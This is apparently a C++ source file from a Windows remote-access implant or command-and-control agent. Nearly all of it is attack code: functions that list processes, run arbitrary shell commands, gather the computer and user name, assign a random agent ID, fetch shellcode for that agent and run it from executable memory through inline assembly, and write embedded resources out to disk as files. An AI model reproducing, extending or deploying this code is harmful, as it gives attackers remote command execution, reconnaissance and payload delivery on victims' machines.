#include "Commands.h"




LPCSTR ProcessList(){
	std::string pList = ExecuteCommand("tasklist");
	LPSTR lpResponse = new CHAR[MAX_DATA_LENGTH];
	StringCbPrintf(lpResponse,MAX_DATA_LENGTH,"%s",pList.c_str());
	return lpResponse;
}
LPCSTR ExecuteShell(LPCSTR command){
	std::string pList = ExecuteCommand(command);
	LPSTR lpResponse = new CHAR[MAX_DATA_LENGTH];
	StringCbPrintf(lpResponse,MAX_DATA_LENGTH,"%s",pList.c_str());
	return lpResponse;
}
LPCSTR SystemInfo(){
	
	LPSTR lpResponse = new CHAR[MAX_DATA_LENGTH];
	SYSTEM_INFO siSysInfo;
	GetSystemInfo(&siSysInfo); 

	LPSTR computerName = new CHAR[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
	GetComputerNameA(computerName,&len);
	
	DWORD usernameSize = 104;
	LPSTR username = new CHAR[104+1];
	GetUserName(username,&usernameSize);


	StringCbPrintf(lpResponse,MAX_DATA_LENGTH,"----- System Information -----\n\nComputerName: %s\\%s\nNumber of processors: %u\nOEM ID: %u\nProcessor type: %u\n",computerName,username,siSysInfo.dwNumberOfProcessors,siSysInfo.dwOemId,siSysInfo.dwProcessorType);
	
	return lpResponse;
}

char agentName[64];
static const char alphanum[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
int stringLength = sizeof(alphanum) - 1;

LPSTR AgentName(){
	DWORD size = 9;
	if(strlen(agentName)==0){
		std::string tempString;
		srand (time(NULL));
		for(unsigned int i = 0; i < size-1; ++i)
		{
			tempString += alphanum[rand() % stringLength];
		}
		StringCbPrintf(agentName,size,"%s",tempString.c_str());
	}
	return agentName;
}

LPCSTR ExecuteShellcode(){
	
	
	HANDLE hLocalThread;
	DWORD lpThreadId;

	std::string temp = GetShellcode(AgentName());
	if(temp == NO_SHELLCODE){
		return "[-] There was no shellcode [-]";
	}

	LPCSTR data = temp.c_str();

	hLocalThread = CreateThread(NULL,0,InjectShellcode,(LPVOID)data,0,&lpThreadId);
	//WaitForSingleObject(hLocalThread,INFINITE);
	Sleep(5);
	if(hLocalThread != NULL){
		return "[+] Shellcode Injected Successfully [+]";
	}
	return "[-] Failed to inject shellcode [-]";

}

DWORD WINAPI InjectShellcode(LPVOID lpData){
	
	LPVOID buffer = NULL;
	LPCSTR data = (LPCSTR)lpData;
	SIZE_T shLength = strlen(data);
	buffer = VirtualAlloc(NULL,shLength+1,(MEM_COMMIT | MEM_RESERVE),PAGE_EXECUTE_READWRITE);
	memcpy(buffer,data,shLength);
	__asm{
		LEA EAX,buffer
		MOV EDX, DWORD PTR DS:[EAX]
        CALL EDX
    }
	return 0;
}


BOOL DropFileFromRes(LPCSTR fileName,DWORD resourceId){


	HGLOBAL resMemoryHandler;
	HRSRC resHandler;
	LPCSTR resourceName = MAKEINTRESOURCE(resourceId);
	LPCSTR resourceType = RT_RCDATA;
	LPVOID lpData = NULL;
	SIZE_T size;
	DWORD dwBytesWritten = 0;

	
	resHandler = FindResource(NULL,resourceName,resourceType);
	LPVOID data;

	if(resHandler != NULL){
		resMemoryHandler =LoadResource(NULL,resHandler);
		if(resMemoryHandler != NULL){
			lpData = LockResource(resMemoryHandler);
			if(lpData != NULL){
				size = SizeofResource(NULL,resHandler);
				data = VirtualAlloc(NULL,size+1,(MEM_COMMIT | MEM_RESERVE),PAGE_READWRITE);
				memcpy(data,lpData,size);
			}else{
				return FALSE;
			}
		}else{
			return FALSE;
		}
	}else{
		return FALSE;
	}

	HANDLE fileHandler = CreateFile(fileName,(GENERIC_WRITE),FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

	if(fileHandler != INVALID_HANDLE_VALUE){
		WriteFile(fileHandler,data,size,&dwBytesWritten,NULL);
		CloseHandle(fileHandler);
		return TRUE;
	}
	else{
		return FALSE;
	}

}
